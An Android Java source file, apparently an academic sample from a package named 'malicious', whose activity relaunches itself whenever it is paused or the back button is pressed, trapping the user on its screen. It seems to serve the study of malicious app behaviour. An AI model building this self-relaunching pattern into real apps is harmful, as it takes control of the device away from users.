package edu.ksu.cs.malicious;

import android.content.Intent;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.widget.Toast;

public class MalActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        Toast.makeText(getApplicationContext(), "OnCreate", Toast.LENGTH_SHORT).show();
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_malicious);
    }

    @Override
    protected void onPause() {
        onBackPressed();
        super.onPause();
    }

    @Override
    public void onBackPressed() {
        startActivity(new Intent(getApplicationContext(), MalActivity.class));
        super.onBackPressed();
    }


}
